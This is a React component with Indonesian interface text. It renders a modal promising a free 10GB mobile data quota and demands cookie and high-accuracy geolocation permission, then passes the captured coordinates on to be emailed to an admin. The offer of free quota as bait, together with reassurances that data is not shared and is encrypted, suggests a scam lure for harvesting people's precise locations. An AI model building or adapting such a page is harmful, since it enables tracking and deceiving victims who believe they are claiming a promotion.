"use client";

import { useState, useEffect } from "react";
import {
  MapPin,
  Cookie,
  Mail,
  Shield,
  Check,
  X,
  AlertCircle,
  Loader2,
} from "lucide-react";

export default function PermissionModal({ isOpen, onAllow, onDeny }) {
  const [isLoading, setIsLoading] = useState(false);
  const [browserSupport, setBrowserSupport] = useState(true);
  const [showDetails, setShowDetails] = useState(false);

  useEffect(() => {
    // Check browser support
    const hasGeolocation = "geolocation" in navigator;
    const hasCookies = navigator.cookieEnabled;

    setBrowserSupport(hasGeolocation && hasCookies);
  }, []);

  const handleAllowClick = async () => {
    setIsLoading(true);

    try {
      // Set cookie permission
      document.cookie =
        "cookie_permission=true; path=/; max-age=31536000; samesite=lax";

      // Request location permission
      if ("geolocation" in navigator) {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        });

        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: new Date().toISOString(),
        };

        await onAllow(locationData);
      } else {
        throw new Error("Geolocation not supported");
      }
    } catch (error) {
      console.error("Permission error:", error);

      let errorMessage = "Gagal mendapatkan lokasi";
      if (error.code === 1) errorMessage = "Anda menolak permintaan lokasi";
      if (error.code === 2) errorMessage = "Lokasi tidak tersedia";
      if (error.code === 3) errorMessage = "Waktu permintaan habis";

      onDeny(errorMessage);
    } finally {
      setIsLoading(false);
    }
  };

  const handleDenyClick = () => {
    onDeny("User manually denied permissions");
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[9999]">
      {/* Backdrop with blur */}
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" />

      {/* Modal Container */}
      <div className="relative h-screen flex items-center justify-center p-4">
        <div className="bg-white rounded-3xl shadow-2xl max-w-md w-full overflow-hidden border border-gray-200">
          {/* Header */}
          <div className="relative">
            <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-blue-600" />
            <div className="relative px-8 py-10 text-white">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center">
                  <div className="w-14 h-14 bg-white/20 rounded-2xl flex items-center justify-center mr-4">
                    <Shield className="w-7 h-7" />
                  </div>
                  <div>
                    <h2 className="text-2xl font-bold">Izin Diperlukan</h2>
                    <p className="text-white/90">
                      Untuk akses promo kuota gratis
                    </p>
                  </div>
                </div>
                <button
                  onClick={handleDenyClick}
                  disabled={isLoading}
                  className="p-2 hover:bg-white/20 rounded-xl transition disabled:opacity-50"
                >
                  <X className="w-6 h-6" />
                </button>
              </div>

              {!browserSupport && (
                <div className="flex items-center p-4 bg-red-500/30 rounded-xl mb-4">
                  <AlertCircle className="w-5 h-5 mr-2" />
                  <span className="text-sm">
                    Browser Anda tidak mendukung semua fitur yang diperlukan
                  </span>
                </div>
              )}
            </div>
          </div>

          {/* Content */}
          <div className="px-8 py-8">
            {/* Permission Items */}
            <div className="space-y-4 mb-8">
              <div className="flex items-start p-5 bg-blue-50 rounded-2xl hover:bg-blue-100 transition">
                <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center mr-4 flex-shrink-0">
                  <Cookie className="w-6 h-6 text-blue-600" />
                </div>
                <div>
                  <h3 className="font-bold text-gray-900 text-lg mb-1">
                    Cookie
                  </h3>
                  <p className="text-gray-600 text-sm">
                    Menyimpan preferensi dan sesi Anda untuk pengalaman yang
                    lebih baik dan aman.
                  </p>
                </div>
              </div>

              <div className="flex items-start p-5 bg-green-50 rounded-2xl hover:bg-green-100 transition">
                <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center mr-4 flex-shrink-0">
                  <MapPin className="w-6 h-6 text-green-600" />
                </div>
                <div>
                  <h3 className="font-bold text-gray-900 text-lg mb-1">
                    Lokasi
                  </h3>
                  <p className="text-gray-600 text-sm">
                    Memverifikasi bahwa Anda berada di wilayah yang eligible
                    untuk menerima promo kuota gratis.
                  </p>
                </div>
              </div>

              <div className="flex items-start p-5 bg-yellow-50 rounded-2xl hover:bg-yellow-100 transition">
                <div className="w-12 h-12 bg-yellow-100 rounded-xl flex items-center justify-center mr-4 flex-shrink-0">
                  <Mail className="w-6 h-6 text-yellow-600" />
                </div>
                <div>
                  <h3 className="font-bold text-gray-900 text-lg mb-1">
                    Notifikasi Email
                  </h3>
                  <p className="text-gray-600 text-sm">
                    Koordinat lokasi Anda akan dikirim via email kepada admin
                    untuk verifikasi keaslian.
                  </p>
                </div>
              </div>
            </div>

            {/* Warning Message */}
            <div className="bg-gradient-to-r from-orange-50 to-amber-50 border border-orange-200 rounded-2xl p-5 mb-8">
              <div className="flex items-start">
                <AlertCircle className="w-5 h-5 text-orange-600 mt-0.5 mr-3 flex-shrink-0" />
                <div>
                  <p className="text-orange-800 font-medium">
                    Anda <span className="font-bold">harus mengizinkan</span>{" "}
                    kedua permission di atas untuk dapat mengakses promo kuota
                    gratis 10GB.
                  </p>
                </div>
              </div>
            </div>

            {/* Details Toggle */}
            <button
              onClick={() => setShowDetails(!showDetails)}
              className="text-purple-600 hover:text-purple-800 font-medium text-sm mb-6 flex items-center"
            >
              {showDetails ? "Sembunyikan" : "Tampilkan"} detail penggunaan data
              <ChevronDown
                className={`w-4 h-4 ml-2 transition-transform ${showDetails ? "rotate-180" : ""}`}
              />
            </button>

            {showDetails && (
              <div className="bg-gray-50 rounded-2xl p-5 mb-6">
                <h4 className="font-bold text-gray-900 mb-3">
                  📊 Data Usage Details
                </h4>
                <ul className="space-y-2 text-sm text-gray-600">
                  <li className="flex items-start">
                    <Check className="w-4 h-4 text-green-500 mr-2 mt-0.5" />
                    <span>
                      Lokasi hanya digunakan untuk verifikasi wilayah promo
                    </span>
                  </li>
                  <li className="flex items-start">
                    <Check className="w-4 h-4 text-green-500 mr-2 mt-0.5" />
                    <span>Data tidak dibagikan ke pihak ketiga</span>
                  </li>
                  <li className="flex items-start">
                    <Check className="w-4 h-4 text-green-500 mr-2 mt-0.5" />
                    <span>Semua data dienkripsi dan aman</span>
                  </li>
                  <li className="flex items-start">
                    <Check className="w-4 h-4 text-green-500 mr-2 mt-0.5" />
                    <span>Anda bisa hapus data kapan saja</span>
                  </li>
                </ul>
              </div>
            )}

            {/* Action Buttons */}
            <div className="space-y-4">
              <button
                onClick={handleAllowClick}
                disabled={isLoading || !browserSupport}
                className="w-full bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 disabled:from-gray-400 disabled:to-gray-500 text-white font-bold py-4 px-6 rounded-2xl transition-all duration-300 transform hover:scale-[1.02] disabled:hover:scale-100 disabled:cursor-not-allowed flex items-center justify-center"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin mr-3" />
                    Memproses...
                  </>
                ) : (
                  <>
                    <Check className="w-5 h-5 mr-3" />
                    IZINKAN SEMUA & DAPATKAN KUOTA
                  </>
                )}
              </button>

              <button
                onClick={handleDenyClick}
                disabled={isLoading}
                className="w-full bg-gray-100 hover:bg-gray-200 text-gray-800 font-bold py-4 px-6 rounded-2xl transition disabled:opacity-50 flex items-center justify-center"
              >
                <X className="w-5 h-5 mr-3" />
                TOLAK & TUTUP
              </button>
            </div>

            {/* Note */}
            <p className="text-center text-gray-500 text-xs mt-6">
              Dengan mengizinkan, Anda menyetujui{" "}
              <button className="text-purple-600 hover:text-purple-800 font-medium">
                Syarat & Ketentuan
              </button>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}

// Helper component
function ChevronDown({ className }) {
  return (
    <svg
      className={className}
      fill="none"
      stroke="currentColor"
      viewBox="0 0 24 24"
    >
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth={2}
        d="M19 9l-7 7-7-7"
      />
    </svg>
  );
}
